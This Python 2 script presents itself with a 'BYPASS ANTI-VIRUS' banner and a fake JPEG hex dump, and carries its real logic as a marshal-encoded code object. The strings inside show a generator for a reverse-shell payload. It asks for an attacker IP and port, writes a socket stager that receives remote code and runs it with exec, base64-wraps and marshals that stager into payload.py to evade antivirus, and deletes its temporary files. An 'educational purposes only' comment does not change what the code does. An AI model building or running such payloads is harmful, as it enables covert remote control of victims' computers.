#!/usr/bin/python
# -*- coding: utf-8 -*-
import marshal,os
a='\n'
at='\n\t'
att='\n\t\t'
print("""
01010010  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 60  |......JFIF.....`|
00000010  00 60 00 00 ff fe 00 20  3c 73 63 72 69 70 74 20  |.`..... <script |
03400020  73 72 63 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |src//nji.ATZ></s|
00300030  63 72 69 70 74 3e ff db  00 43 00 08 06 06 07 06  |cript>...C......|
07300040  05 08 07 07 07 09 09 08  0a 0c 14 0d 0c 0b 0b 0c  |...K....Y.......|
00490050  19 12 13 0f 14 1d 1a 1f  1e 1d 1a 1c 1c 20 24 2e  |............. $.|
00023060  27 20 22 2c 23 1c 1c 28  37 29 2c 30 31 34 34 34  |' ",#..(7),01444|
08200070  1f 27 39 3d 38 32 3c 2e  33 34 32 ff db 00 43 01  |.'9=82<.342.D.C.|
00300080  09 09 09 0c 0b 0c 18 0d  0d 18 32 21 1c 21 32 32  |...N......2!.!22|
07200090  32 32 32 32 32 32 32 32  32 32 32 32 32 32 32 32  |2222222M22222222|
                            #################
                            BYPASS ANTI-VIRUS
                            #################
""")

exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00sx\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00d\x00\x00d\x01\x00l\x02\x00Z\x02\x00d\x00\x00d\x01\x00l\x03\x00Z\x03\x00d\x00\x00d\x01\x00l\x04\x00Z\x04\x00d\x00\x00d\x01\x00l\x05\x00Z\x05\x00d\x00\x00d\x01\x00l\x06\x00Z\x06\x00d\x02\x00\x84\x00\x00Z\x07\x00d\x03\x00\x84\x00\x00Z\x08\x00e\x07\x00\x83\x00\x00\x01e\x08\x00\x83\x00\x00\x01d\x01\x00S(\x04\x00\x00\x00i\xff\xff\xff\xffNc\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00sE\x01\x00\x00yF\x00t\x00\x00d\x01\x00\x83\x01\x00}\x00\x00t\x00\x00d\x02\x00\x83\x01\x00}\x01\x00t\x01\x00j\x01\x00d\x03\x00\x83\x01\x00}\x02\x00|\x02\x00|\x00\x00k\x02\x00r9\x00n\x0c\x00d\x04\x00GHt\x02\x00\x83\x00\x00\x01Wn\x18\x00\x04t\x03\x00k\n\x00r`\x00\x01\x01\x01t\x02\x00\x83\x00\x00\x01n\xe1\x00Xt\x04\x00d\x05\x00d\x06\x00\x83\x02\x00}\x03\x00|\x03\x00j\x05\x00d\x07\x00t\x06\x00t\x07\x00\x83\x01\x00\x17d\x08\x00\x17t\x06\x00t\x08\x00\x83\x01\x00\x17d\t\x00\x17t\x06\x00t\t\x00\x83\x01\x00\x17d\n\x00\x17t\x06\x00t\t\x00\x83\x01\x00\x17d\x0b\x00\x17t\x06\x00|\x00\x00\x83\x01\x00\x17d\x0c\x00\x17t\x06\x00|\x01\x00\x83\x01\x00\x17d\r\x00\x17t\x06\x00t\t\x00\x83\x01\x00\x17d\x0e\x00\x17t\x06\x00t\x08\x00\x83\x01\x00\x17d\x0f\x00\x17t\x06\x00t\t\x00\x83\x01\x00\x17d\x10\x00\x17t\x06\x00t\x07\x00\x83\x01\x00\x17d\x11\x00\x17t\x06\x00t\x07\x00\x83\x01\x00\x17d\x12\x00\x17t\x06\x00t\x07\x00\x83\x01\x00\x17d\x13\x00\x17t\x06\x00t\x08\x00\x83\x01\x00\x17d\x14\x00\x17t\x06\x00t\x07\x00\x83\x01\x00\x17d\x15\x00\x17\x83\x01\x00\x01d\x00\x00S(\x16\x00\x00\x00Ns\x1f\x00\x00\x00[<<]Enter Your IP Address[>>]: s\x1b\x00\x00\x00[<<]Enter Port Number[>>]: s\x16\x00\x00\x00[?]Enter Password[?]: s\x15\x00\x00\x00Incorrect Password!!!s\x06\x00\x00\x00.co.pyt\x01\x00\x00\x00ws\x19\x00\x00\x00import socket,struct,times\x13\x00\x00\x00for x in range(10):s\x04\x00\x00\x00try:s%\x00\x00\x00s=socket.socket(2,socket.SOCK_STREAM)s\x0c\x00\x00\x00s.connect((\'s\x02\x00\x00\x00\',s\x02\x00\x00\x00))t\x05\x00\x00\x00breaks\x07\x00\x00\x00except:s\r\x00\x00\x00time.sleep(5)s"\x00\x00\x00l=struct.unpack(\'>I\',s.recv(4))[0]s\x0b\x00\x00\x00d=s.recv(l)s\x0f\x00\x00\x00while len(d)<l:s\x13\x00\x00\x00d+=s.recv(l-len(d))s\x0f\x00\x00\x00exec(d,{\'s\':s})(\n\x00\x00\x00t\t\x00\x00\x00raw_inputt\x07\x00\x00\x00getpasst\x04\x00\x00\x00exitt\x11\x00\x00\x00KeyboardInterruptt\x04\x00\x00\x00opent\x05\x00\x00\x00writet\x03\x00\x00\x00strt\x01\x00\x00\x00at\x02\x00\x00\x00att\x03\x00\x00\x00att(\x04\x00\x00\x00t\x02\x00\x00\x00ipt\x04\x00\x00\x00portt\x03\x00\x00\x00pwdt\x04\x00\x00\x00file(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<script>t\x04\x00\x00\x00main\x03\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x03\x01\x0c\x01\x0c\x01\x0f\x01\x0c\x01\x03\x02\x05\x01\x0b\x01\r\x01\x0b\x02\x0f\x01c\x00\x00\x00\x00\n\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s4\x01\x00\x00t\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00}\x00\x00t\x02\x00j\x03\x00|\x00\x00j\x04\x00d\x03\x00\x83\x01\x00\x83\x01\x00}\x01\x00t\x05\x00|\x01\x00\x83\x01\x00}\x02\x00t\x00\x00d\x04\x00d\x05\x00\x83\x02\x00}\x03\x00|\x03\x00j\x06\x00d\x06\x00|\x02\x00\x17d\x07\x00\x17\x83\x01\x00\x01|\x03\x00j\x07\x00\x83\x00\x00\x01t\x08\x00j\t\x00d\x08\x00\x83\x01\x00\x01t\x00\x00d\x04\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00}\x04\x00t\n\x00|\x04\x00d\t\x00d\n\x00\x83\x03\x00}\x05\x00t\x0b\x00j\x0c\x00|\x05\x00\x83\x01\x00}\x06\x00t\r\x00|\x06\x00\x83\x01\x00}\x07\x00d\x0b\x00t\x05\x00t\x0e\x00\x83\x01\x00\x17d\x0c\x00\x17t\x05\x00t\x0e\x00\x83\x01\x00\x17d\r\x00\x17t\x05\x00t\x0e\x00\x83\x01\x00\x17d\x0e\x00\x17|\x07\x00\x17d\x0f\x00\x17}\x08\x00t\x00\x00d\x10\x00d\x05\x00\x83\x02\x00}\t\x00|\t\x00j\x06\x00|\x08\x00\x83\x01\x00\x01t\x05\x00t\x0e\x00\x83\x01\x00d\x11\x00\x17GHd\x12\x00GHd\x11\x00GHt\x08\x00j\t\x00d\x13\x00\x83\x01\x00\x01d\x00\x00S(\x14\x00\x00\x00Ns\x06\x00\x00\x00.co.pyt\x01\x00\x00\x00rt\x04\x00\x00\x00utf8s\x0b\x00\x00\x00.payload.pyR\x00\x00\x00\x00sb\x00\x00\x00import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,\'UTF-8\')}[sys.version_info[0]](\'s\x04\x00\x00\x00\')))s\t\x00\x00\x00rm .co.pys\x08\x00\x00\x00<script>t\x04\x00\x00\x00execs\x11\x00\x00\x00#!/usr/bin/pythons\x17\x00\x00\x00# -*- coding: utf-8 -*-s\x0e\x00\x00\x00import marshals\x13\x00\x00\x00exec marshal.loads(t\x01\x00\x00\x00)s\n\x00\x00\x00payload.pys\'\x00\x00\x00#######################################s\'\x00\x00\x00#        [***]Successful[***]         #s\x0e\x00\x00\x00rm .payload.py(\x0f\x00\x00\x00R\x06\x00\x00\x00t\x04\x00\x00\x00readt\x06\x00\x00\x00base64t\t\x00\x00\x00b64encodet\x06\x00\x00\x00encodeR\x08\x00\x00\x00R\x07\x00\x00\x00t\x05\x00\x00\x00closet\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x07\x00\x00\x00compilet\x07\x00\x00\x00marshalt\x05\x00\x00\x00dumpst\x04\x00\x00\x00reprR\t\x00\x00\x00(\n\x00\x00\x00t\x05\x00\x00\x00fnamet\x03\x00\x00\x00enct\x04\x00\x00\x00showt\x02\x00\x00\x00fit\x06\x00\x00\x00scriptt\x04\x00\x00\x00codet\x04\x00\x00\x00datat\x03\x00\x00\x00rept\x03\x00\x00\x00outt\x02\x00\x00\x00ff(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<script>t\x03\x00\x00\x00run\x16\x00\x00\x00s$\x00\x00\x00\x00\x02\x15\x01\x18\x01\x0c\x02\x0f\x01\x15\x01\n\x01\r\x02\x15\x01\x12\x02\x0f\x02\x0c\x018\x02\x0f\x01\r\x02\x0f\x01\x05\x01\x05\x01(\t\x00\x00\x00t\x06\x00\x00\x00sockett\x06\x00\x00\x00structt\x04\x00\x00\x00timet\x06\x00\x00\x00codecsR\x16\x00\x00\x00R\x1d\x00\x00\x00R\x03\x00\x00\x00R\x10\x00\x00\x00R*\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<script>t\x08\x00\x00\x00<module>\x02\x00\x00\x00s\x08\x00\x00\x00T\x01\t\x13\t\x1b\x07\x01')

# ThIS SCrIPt IS fOR EduCaTIoNal PuRpOsEes OnLY//
# Note::://
# =>−·− −·−− −·· −· −−//
# Author ::::ATZ//
# Email:at.z.at.z.x@gmail.com//
